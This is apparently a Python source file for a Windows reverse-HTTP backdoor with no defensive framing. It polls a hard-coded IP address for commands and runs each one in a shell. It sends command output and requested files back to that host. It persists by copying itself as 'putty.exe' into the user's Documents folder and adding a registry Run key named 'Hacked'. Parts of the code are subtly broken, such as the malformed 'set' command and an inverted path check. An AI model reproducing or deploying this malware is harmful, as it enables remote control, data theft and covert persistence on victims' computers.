import requests
import subprocess
import time
import os
import shutil
import _winreg as wreg

url = "http://172.26.47.11"


def persistence():
    path = os.getcwd().strip('\n')  # get the current working directory
    Null, userprof = subprocess.check_output('set: USERPROFILE', shell=True).split('=')  # Get userprofile

    # Place where you wish your backdoor to be copied , here it is C:\Users\<UserName>\Documents
    destination = userprof.strip('\n\r') + '\\Documents' + 'putty.exe'

    if not os.path.exists(path=path):
        shutil.copyfile(path + '\putty.exe', destination)
        # This is one of the keys that allows to run on startup , others can be found using
        # sysinternals tools and other methods like googling
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",
                           0, wreg.KEY_ALL_ACCESS)
        # Hacked is the key name that will run our backdoor on startup
        wreg.SetValueEx(key, 'Hacked', 0, wreg.REG_SZ, destination)
        key.Close()


def sendPost(Url, data, files=None):
    response = requests.post(url=Url, proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=data)
    return response

persistence()


while True:
    req = requests.get(url)
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab, path = command.split('*')
        if os.path.exists(path):
            newUrl = url + '/store'
            files = {'file': open(path, 'rb')}
            r = sendPost(url, files=files)
        else:
            r = sendPost(url, data='[-]File Not Found')
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = sendPost(url, CMD.stdout.read())
        post_response = sendPost(url, CMD.stderr.read())

    time.sleep(3)
